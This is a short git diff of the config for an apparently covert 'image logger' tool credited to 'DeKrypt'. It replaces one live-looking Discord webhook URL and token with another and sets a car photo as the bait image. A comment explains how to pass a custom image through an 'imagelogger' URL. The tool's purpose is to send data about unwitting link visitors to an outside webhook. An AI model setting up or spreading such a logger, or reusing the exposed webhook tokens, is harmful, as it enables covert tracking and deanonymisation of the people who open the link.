@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1429930759128617126/qGax7mufpJIgjdKryMaLMDii2baBOo2UFbUazW4OfMgz7ef9pNmAD0FujtxxSRU6Jqhe",
+    "webhook": "https://discord.com/api/webhooks/1430122241416237170/1NWS2gm-ryRe7ifFSowiBRNu1fe6fSdleIaPINzk3rPQJnjffudvaDitV5lM4z1bZpqp",
     "image": "https://media.cdn-jaguarlandrover.com/api/v2/images/55880/w/680.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
